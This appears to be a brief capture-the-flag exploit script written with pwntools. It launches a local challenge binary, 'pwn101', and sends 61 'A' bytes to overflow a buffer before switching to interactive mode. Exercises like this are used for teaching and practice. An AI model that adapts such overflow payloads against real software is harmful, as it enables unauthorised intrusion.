from pwn import *

p = process("./pwn101.pwn101")

p.sendline(b"A"*61)
p.recv()

p.interactive()
